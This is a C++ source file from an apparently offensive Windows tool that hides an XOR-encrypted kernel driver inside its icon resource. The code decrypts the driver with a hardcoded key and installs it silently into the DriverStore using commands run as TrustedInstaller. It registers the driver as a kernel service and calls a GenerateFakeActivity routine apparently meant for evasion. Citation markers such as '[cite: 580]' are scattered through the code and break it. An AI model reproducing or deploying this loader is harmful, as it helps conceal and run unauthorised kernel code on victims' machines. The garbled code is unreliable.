// ControllerDriverManager.cpp
#include "Controller.h"
#include "common.h"
#include "Utils.h"
#include "resource.h"
#include <filesystem>

namespace fs = std::filesystem;

// Attempts to forcefully remove the driver service, ignoring most errors.
// This is a cleanup utility to ensure a clean state before installation.
bool Controller::ForceRemoveService() noexcept {
    // Ensure Service Control Manager (SCM) APIs are loaded.
    if (!InitDynamicAPIs()) {
        return false;
    }

    // Open the Service Control Manager with full access rights.
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) {
        return false;
    }

    // Try to open the service with DELETE access.
    SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), DELETE);
    if (!hService) {
        DWORD err = GetLastError();
        CloseServiceHandle(hSCM);
        // If the service doesn't exist, consider it a success.
        return (err == ERROR_SERVICE_DOES_NOT_EXIST);
    }

    // Attempt to delete the service.
    BOOL success = g_pDeleteService(hService);
    DWORD err = GetLastError();
    
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    // The operation is successful if DeleteService succeeded or if the service
    // was already marked for deletion.
    return success || (err == ERROR_SERVICE_MARKED_FOR_DELETE);
}


// Stops the driver service if it is running.
bool Controller::StopDriverService() noexcept {
    DEBUG(L"StopDriverService called");
    // Ensure SCM APIs are loaded.
    if (!InitDynamicAPIs()) {
        DEBUG(L"InitDynamicAPIs failed in StopDriverService");
        return false;
    }
    
    // Connect to the Service Control Manager.
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!hSCM) {
        DEBUG(L"OpenSCManagerW failed: %d", GetLastError());
        return false;
    }

    // Open the service with permissions to stop and query its status.
    SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hService) {
        DWORD err = GetLastError();
        CloseServiceHandle(hSCM);
        // If the service doesn't exist, it's already "stopped".
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) {
            DEBUG(L"Service does not exist - considered stopped");
            return true;
        }
        
        DEBUG(L"OpenServiceW failed: %d", err);
        return false;
    }

    // Check if the service is already stopped.
    SERVICE_STATUS status;
    if (QueryServiceStatus(hService, &status)) {
        if (status.dwCurrentState == SERVICE_STOPPED) {
            DEBUG(L"Service already stopped");
            CloseServiceHandle(hService);
            CloseServiceHandle(hSCM);
            return true;
        }
    }

    // Send a stop control code to the service.
    SERVICE_STATUS stopStatus;
    BOOL success = g_pControlService(hService, SERVICE_CONTROL_STOP, &stopStatus);
    DWORD err = GetLastError();

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    DEBUG(L"ControlService result: %d, error: %d", success, err);
    
    // The operation is successful if ControlService succeeded or if the service was not active.
    return success || err == ERROR_SERVICE_NOT_ACTIVE;
}

// Extracts the encrypted driver binary hidden within the main icon resource.
std::vector<BYTE> Controller::ExtractEncryptedDriver() noexcept {
    // Read the entire content of the icon resource.
    [cite_start]auto iconData = Utils::ReadResource(IDR_MAINICON, RT_RCDATA); [cite: 576]
    // The first 9662 bytes are the actual icon; the rest is the steganographically embedded driver.
    [cite_start]if (iconData.size() <= 9662) { [cite: 577]
        [cite_start]ERROR(L"Icon resource too small or corrupted - steganographic driver missing"); [cite: 577]
        return {};
    }
    // Return the byte vector containing only the encrypted driver data.
    [cite_start]return std::vector<BYTE>(iconData.begin() + 9662, iconData.end()); [cite: 578]
}

// Decrypts the driver binary using a repeating XOR key.
std::vector<BYTE> Controller::DecryptDriver(const std::vector<BYTE>& encryptedData) noexcept {
    [cite_start]if (encryptedData.empty()) { [cite: 579]
        [cite_start]ERROR(L"No encrypted driver data provided"); [cite: 579]
        return {};
    }

    // The predefined 7-byte XOR key for decryption.
    [cite_start]constexpr std::array<BYTE, 7> key = { 0xA0, 0xE2, 0x80, 0x8B, 0xE2, 0x80, 0x8C }; [cite: 580]
    std::vector<BYTE> decryptedData = encryptedData;
    
    // Perform XOR decryption on each byte using the repeating key.
    for (size_t i = 0; i < decryptedData.size(); ++i) {
        [cite_start]decryptedData[i] ^= key[i % key.size()]; [cite: 581]
    }
    
    return decryptedData;
}

// Performs a silent, on-demand installation of the driver for atomic operations.
bool Controller::InstallDriverSilently() noexcept {
    // Ensure no previous instance of the service exists.
    ForceRemoveService();
    // Extract the encrypted driver from resources.
	auto encryptedData = ExtractEncryptedDriver();
    [cite_start]if (encryptedData.empty()) return false; [cite: 583]
    
    // Decrypt the driver binary.
    auto driverData = DecryptDriver(encryptedData);
    if (driverData.empty()) return false;

    // Write the decrypted driver to a temporary system location.
    [cite_start]fs::path tempDir = GetSystemTempPath(); [cite: 584]
    fs::path tempDriverPath = tempDir / fs::path(GetDriverFileName());
    if (!Utils::WriteFile(tempDriverPath.wstring(), driverData)) return false;

    // Determine the final destination in the system DriverStore.
    [cite_start]fs::path driverDir = GetDriverStorePath(); [cite: 585]
    // Ensure the target directory exists, creating it with TrustedInstaller if necessary.
    [cite_start]DWORD attrs = GetFileAttributesW(driverDir.c_str()); [cite: 586]
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        [cite_start]std::wstring createDirCommand = L"cmd.exe /c mkdir \"" + driverDir.wstring() + L"\""; [cite: 587]
        [cite_start]if (!RunAsTrustedInstallerSilent(createDirCommand)) { [cite: 588]
            [cite_start]DeleteFileW(tempDriverPath.c_str()); [cite: 588]
            [cite_start]ERROR(L"Failed to create driver directory with TrustedInstaller privileges"); [cite: 589]
            return false;
        }
    }
    
    // Copy the driver from the temp location to the DriverStore using TrustedInstaller.
    [cite_start]fs::path driverPath = driverDir / fs::path(GetDriverFileName()); [cite: 590]
    [cite_start]std::wstring copyCommand = L"cmd.exe /c copy /Y \"" + tempDriverPath.wstring() + L"\" \"" + driverPath.wstring() + L"\""; [cite: 591]
    if (!RunAsTrustedInstallerSilent(copyCommand)) {
        DeleteFileW(tempDriverPath.c_str());
        return false;
    }

    // Clean up the temporary driver file.
    DeleteFileW(tempDriverPath.c_str());
    
    // Register the driver as a kernel service.
    [cite_start]return RegisterDriverServiceSilent(driverPath.wstring()); [cite: 592]
}

// Registers the driver as a temporary, on-demand kernel service.
bool Controller::RegisterDriverServiceSilent(const std::wstring& driverPath) noexcept {
    if (!InitDynamicAPIs()) return false;
    GenerateFakeActivity();
    
    // Open the Service Control Manager with full access.
    [cite_start]SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS); [cite: 593]
    if (!hSCM) return false;

    // Create the kernel service.
    SC_HANDLE hService = g_pCreateServiceW(
        hSCM, 
        GetServiceName().c_str(), 
        L"Kernel Driver Service",
        SERVICE_ALL_ACCESS, 
        SERVICE_KERNEL_DRIVER,  // Specify service type as kernel driver.
        SERVICE_DEMAND_START,   // Service must be started manually.
        SERVICE_ERROR_NORMAL, 
        driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    [cite_start]); [cite: 594]

    // Check if the service was created or if it already exists.
    bool success = (hService != nullptr) || (GetLastError() [cite_start]== ERROR_SERVICE_EXISTS); [cite: 595]
    
    if (hService) CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return success;
}

// Starts the previously registered kernel driver service silently.
bool Controller::StartDriverServiceSilent() noexcept {
    [cite_start]if (!InitDynamicAPIs()) return false; [cite: 596]
    GenerateFakeActivity();
    
    // Open the Service Control Manager.
    SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS);
    if (!hSCM) return false;

    // Open the service with rights to start and query.
    [cite_start]SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_START | SERVICE_QUERY_STATUS); [cite: 597]
    if (!hService) {
        CloseServiceHandle(hSCM);
        return false;
    }

    SERVICE_STATUS status;
    bool success = true;
    
    // Query the service status.
    [cite_start]if (QueryServiceStatus(hService, &status)) { [cite: 598]
        // If it's not running, start it.
        if (status.dwCurrentState != SERVICE_RUNNING) {
            success = g_pStartServiceW(hService, 0, nullptr) || (GetLastError() [cite_start]== ERROR_SERVICE_ALREADY_RUNNING); [cite: 599]
        }
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    return success;
}

// Legacy driver installation with verbose logging.
bool Controller::InstallDriver() noexcept {
    // Ensure a clean state by removing any previous service.
	ForceRemoveService();
    // Extract and decrypt the driver from the application's resources.
    [cite_start]auto encryptedData = ExtractEncryptedDriver(); [cite: 601]
    if (encryptedData.empty()) {
        [cite_start]ERROR(L"Failed to extract encrypted driver from icon resource"); [cite: 602]
        return false;
    }
    
    [cite_start]auto driverData = DecryptDriver(encryptedData); [cite: 603]
    if (driverData.empty()) {
        [cite_start]ERROR(L"Failed to decrypt embedded driver data"); [cite: 604]
        return false;
    }

    // Write the driver to a temporary location first.
    fs::path tempDir = fs::temp_directory_path();
    fs::path tempDriverPath = tempDir / fs::path(GetDriverFileName());
    [cite_start]if (!Utils::WriteFile(tempDriverPath.wstring(), driverData)) { [cite: 605]
        [cite_start]ERROR(L"Failed to write driver file to temp location: %s", tempDriverPath.c_str()); [cite: 606]
        return false;
    }

    // Define the final path in the system's DriverStore.
    fs::path driverDir = GetDriverStorePath();
    fs::path driverPath = driverDir / fs::path(GetDriverFileName());

    // Create the destination directory.
    std::error_code ec;
    [cite_start]fs::create_directories(driverDir, ec); [cite: 607]
    if (ec) {
        [cite_start]INFO(L"Directory creation failed (may already exist)"); [cite: 608]
    }

    // Use a command prompt with TrustedInstaller privileges to copy the driver file.
    [cite_start]std::wstring copyCommand = L"cmd.exe /c copy /Y " + tempDriverPath.wstring() + L" " + driverPath.wstring(); [cite: 609]
    INFO(L"Copying driver with elevated privileges: %s", copyCommand.c_str());

    [cite_start]if (!RunAsTrustedInstaller(copyCommand)) { [cite: 610]
        ERROR(L"Failed to copy driver to system directory with elevated privileges");
        [cite_start]DeleteFileW(tempDriverPath.c_str()); [cite: 610]
        return false;
    }

    // Verify the copy was successful.
    [cite_start]if (!fs::exists(driverPath)) { [cite: 611]
        ERROR(L"Driver file was not copied successfully to: %s", driverPath.c_str());
        [cite_start]DeleteFileW(tempDriverPath.c_str()); [cite: 611]
        return false;
    }

    SUCCESS(L"Driver file successfully copied to: %s", driverPath.c_str());
    DeleteFileW(tempDriverPath.c_str());

    // Register the driver as a kernel service.
    if (!InitDynamicAPIs()) return false;
    GenerateFakeActivity();
    [cite_start]SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS); [cite: 612]
    if (!hSCM) {
        [cite_start]ERROR(L"Failed to open service control manager: %d", GetLastError()); [cite: 613]
        return false;
    }

    SC_HANDLE hService = g_pCreateServiceW(
        hSCM, GetServiceName().c_str(), L"Memory Access Driver",
        SERVICE_ALL_ACCESS, 
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL, driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr
    [cite_start]); [cite: 614]
    if (!hService) {
        DWORD err = GetLastError();
        CloseServiceHandle(hSCM);
        [cite_start]if (err != ERROR_SERVICE_EXISTS) { [cite: 615]
            [cite_start]ERROR(L"Failed to create driver service: %d", err); [cite: 616]
            return false;
        }
        
        [cite_start]INFO(L"Driver service already exists, proceeding"); [cite: 617]
    } else {
        CloseServiceHandle(hService);
        SUCCESS(L"Driver service created successfully");
    }

    CloseServiceHandle(hSCM);
    [cite_start]SUCCESS(L"Driver installed and registered as Windows service"); [cite: 618]
    return true;
}

// Uninstalls the driver service and cleans up the driver file.
bool Controller::UninstallDriver() noexcept {
    // Attempt to stop the service before uninstalling.
    [cite_start]StopDriverService(); [cite: 619]
    if (!InitDynamicAPIs()) return true;

    // Open the Service Control Manager.
    [cite_start]SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS); [cite: 620]
    if (!hSCM) {
        return true;
    }

    // Open the service with DELETE access.
    [cite_start]std::wstring serviceName = GetServiceName(); [cite: 621]
    SC_HANDLE hService = g_pOpenServiceW(hSCM, serviceName.c_str(), DELETE);
    [cite_start]if (!hService) { [cite: 622]
        CloseServiceHandle(hSCM);
        return true;
    }

    // Delete the service.
    [cite_start]BOOL success = g_pDeleteService(hService); [cite: 623]
    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);
    if (!success) {
        [cite_start]DWORD err = GetLastError(); [cite: 624]
        if (err != ERROR_SERVICE_MARKED_FOR_DELETE) {
            [cite_start]ERROR(L"Failed to delete driver service: %d", err); [cite: 625]
            return false;
        }
    }

    // Clean up the driver file from the DriverStore.
    [cite_start]fs::path driverDir = GetDriverStorePath(); [cite: 626]
    fs::path driverPath = driverDir / fs::path(GetDriverFileName());
    
    // Attempt to remove the file, fallback to TrustedInstaller if it fails.
    std::error_code ec;
    if (!fs::remove(driverPath, ec)) {
        if (ec.value() != ERROR_FILE_NOT_FOUND) {
            std::wstring delCommand = L"cmd.exe /c del /Q \"" + driverPath.wstring() + L"\"";
            [cite_start]RunAsTrustedInstallerSilent(delCommand); [cite: 627]
        }
    }

    return true;
}

// Starts the driver service with verbose logging.
bool Controller::StartDriverService() noexcept {
    if (!InitDynamicAPIs()) return false;
    GenerateFakeActivity();
    
    // Open the Service Control Manager.
    [cite_start]SC_HANDLE hSCM = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_ALL_ACCESS); [cite: 629]
    if (!hSCM) {
        [cite_start]ERROR(L"Failed to open service control manager: %d", GetLastError()); [cite: 630]
        return false;
    }

    // Open the service.
    [cite_start]SC_HANDLE hService = g_pOpenServiceW(hSCM, GetServiceName().c_str(), SERVICE_START | SERVICE_QUERY_STATUS); [cite: 631]
    if (!hService) {
        CloseServiceHandle(hSCM);
        [cite_start]ERROR(L"Failed to open kernel driver service: %d", GetLastError()); [cite: 632]
        return false;
    }

    // Check if service is already running.
    SERVICE_STATUS status;
    if (QueryServiceStatus(hService, &status)) {
        if (status.dwCurrentState == SERVICE_RUNNING) {
            [cite_start]CloseServiceHandle(hService); [cite: 633]
            CloseServiceHandle(hSCM);
            INFO(L"Kernel driver service already running");
            return true;
        }
    }

    // Start the service.
    [cite_start]BOOL success = g_pStartServiceW(hService, 0, nullptr); [cite: 634]
    DWORD err = GetLastError();

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCM);

    if (!success && err != ERROR_SERVICE_ALREADY_RUNNING) {
        [cite_start]ERROR(L"Failed to start kernel driver service: %d", err); [cite: 635]
        return false;
    }

    [cite_start]SUCCESS(L"Kernel driver service started successfully"); [cite: 636]
    return true;
}